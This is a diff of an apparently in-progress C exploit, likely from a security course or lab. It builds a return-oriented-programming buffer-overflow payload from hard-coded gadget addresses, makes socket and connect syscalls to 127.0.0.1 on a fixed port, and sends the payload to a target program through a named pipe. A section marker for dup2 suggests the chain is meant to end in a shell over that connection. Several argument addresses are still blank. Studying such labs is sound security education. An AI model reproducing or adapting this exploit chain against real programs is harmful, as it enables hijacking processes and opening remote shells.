@@ -5,18 +5,10 @@
 
 #define PIPEPATH "/tmp/targetpipe"
 
-// For Reference
-// struct sockaddr_in {
-//   char filler[1]; // Byte 0
-//   char af_inent[1]; // Byte 1
-//   char port_num[2]; // Bytes 2-3
-//   char ip_addr[4]; // Bytes 4-7
-//   char filler2[8] // Bytes 8-15
-// } sockaddr_in;
 
 int main(void)
 {
-  char bufr[300]; // address = 0xbfbf671d
+  char bufr[400]; // address = 0xbfbf671d
 
   char trap[] = "\xe5\xb6\xa9\xbb";
 
@@ -53,6 +45,7 @@ int main(void)
   char socket_stack_arg3_address[] = "\x0c\x68\xbf\xbf"; // -> 0, bufr + 239
 
   // connect syscall
+  char con_arg[] = "\x62\x01\x01\x01";
 
   char con_arg_3_addr[] = "";
   
@@ -69,13 +62,16 @@ int main(void)
   // info.filler2 = "\x01\x01\x01\x01\x01\x01\x01\x01"
 
   char sockaddr_in[] = "\x01\x02\x39\x30\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01\x01";
+  char sockaddr_in_addr[] = "\x28\x68\xbf\xbf"; // buf + 267
 
+  char con_arg_16_seed[] = "\x01\x01\x01\xf0";
+  char con_arg_16_addr[] = "";
 
   int i;
   // Fill up buffer
   for(i = 0; i < 131; i++)
     memcpy(bufr + i, "\x01",1);
-
+  //----------------------------------------------------------------------------------------- _socket30
   // get first 8 bits of socket arg-> 8a
   strcpy(bufr + 131, pop_edx); // 0xbbb9dc1b
   strcpy(bufr + 135, socket_arg1);
@@ -89,7 +85,6 @@ int main(void)
   // add next 8 bits of arg
   strcpy(bufr + 155, add_cl_ah); // 0xbba7bdd7
                                  // eax now holds 394-> 18a
-  
   // prepare stack with 3 args for socket syscall
   // clear edx
   strcpy(bufr + 159, xor_edx); // 0xbbb3bed4
@@ -118,7 +113,7 @@ int main(void)
   strcpy(bufr + 219, write_at_ecx_from_edx); // 0xbbb6b87e
 
   // trap into the kernel for _socket30 syscall
-  strcpy(bufr + 223, trap);  // location is 0xbfbf67fc
+  strcpy(bufr + 223, trap);  // 0xbba9b6e5, location is 0xbfbf67fc
   // jump 12 bytes to next gadget
   strcpy(bufr + 227, jump_12); // 0xbbaa8b68
   // socket arg 1 -> 2
@@ -127,15 +122,15 @@ int main(void)
   strcpy(bufr + 235, "\x01\x01\x01\x01");
   // socket arg 3 -> 0
   strcpy(bufr + 239, "\x01\x01\x01\x01");
-
+  //----------------------------------------------------------------------------------------- connect
   // pop ip_address without null chars into edx
   strcpy(bufr + 243, pop_edx); // 0xbbb9dc1b
   strcpy(bufr + 247, con_arg_ip);
   // pop mask into eax
-  strcpy(bufr + 251, pop_eax);
+  strcpy(bufr + 251, pop_eax); // 0xbbb9a0e1
   strcpy(bufr + 255, con_arg_ip_mask); 
   // AND ecx and eax to get ip address
-  strcpy(bufr + 259, and_eax_edx);
+  strcpy(bufr + 259, and_eax_edx); // 0xbbb3e98a
                                   // eax should have 0x0100007f
   // store socket struct and jump over it
   strcpy(bufr + 263, jump_16); // 0xbbad012a
@@ -144,16 +139,53 @@ int main(void)
   strcpy(bufr + 283, pop_edx); // 0xbbb9dc1b
   strcpy(bufr + 287, con_arg_ip_addr);
   // write eax to where edx points
-  strcpy(bufr + 291, write_at_edx_from_eax);
-                                            // 0x0bfbf6824 should store 0x0100007f
-  //
+  strcpy(bufr + 291, write_at_edx_from_eax); // 0xbbb52d79
+                                            // 0xbfbf6828 should store 0x0100007f, sockaddr_in struct finished
+  // use inc to get 0x3 into edx
+  // clear edx and inc to 3
+  strcpy(bufr + 295, xor_edx); // 0xbbb3bed4
+  strcpy(bufr + 299, inc_edx); // 0xbbb7b88a
+  strcpy(bufr + 303, inc_edx); // 0xbbb7b88a
+  strcpy(bufr + 307, inc_edx); // 0xbbb7b88a
+  // pop 3 arg address into ecx 
+  strcpy(bufr + 311, pop_ecx); // 0xbbaa422
+  strcpy(bufr + 315, con_arg_3_addr);
+  // write value of 3 to where ecx points to
+  strcpy(bufr + 319, write_at_ecx_from_edx); // 0xbbb6b87e
+                                            // 0x should have 0x3
+  // use seed to put 0xf0 into eax
+  // pop seed into edx
+  strcpy(bufr + 323, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 327, con_arg_16_seed);
+  // clear eax
+  strcpy(bufr + 331, xor_eax); // 0xbba9b3c2
+  // add last 8 bits of edx to 
+  strcpy(bufr + 335, add_dl_al); // 0xbbbb4607
+  // pop 16 arg address into edx
+  strcpy(bufr + 339, pop_edx); // 0xbbb9dc1b
+  strcpy(bufr + 343, con_arg_16_addr);
+  // write eax to where edx is pointing
+  strcpy(bufr + 347, write_at_edx_from_eax); // 0xbbb52d79
+                                            // 0x should have 0xf0
+  // move 98 into eax                                            
+  // clear eax
+  strcpy(bufr + 351, xor_eax); // 0xbba9b3c2
+  // pop connect arg into edx
+  strcpy(bufr + 355, pop_edx); // 0xbbb9dc1b
+  // add first 8 bits of edx to eax
+  strcpy(bufr + 359, add_dl_al); // 0xbbbb4607
+                                // eax should have 0x62
+  // trap into connect syscall
+  strcpy(bufr + 363, trap);  // 0xbba9b6e5, location is 0xbfbf6868
+  // jump 12 bytes
+  strcpy(bufr + 367, jump_12);
   // hardcoded file descriptor
-  //strcpy(bufr + , "\x01\x01\x01\x01");
+  strcpy(bufr + 371, "\x01\x01\x01\x01");
   // store address of socketaddr_in struct
-  //strcpy(bufr + , sockaddr_in_addr);
+  strcpy(bufr + 375, sockaddr_in_addr);
   // 4 byte value 16
-  //strcpy(bufr + , "\x01\x01\x01\x01");
-
+  strcpy(bufr + 379, "\x01\x01\x01\x01");
+  //----------------------------------------------------------------------------------------- dup2 #1
   writecmd(PIPEPATH, bufr);
   
   return 0;
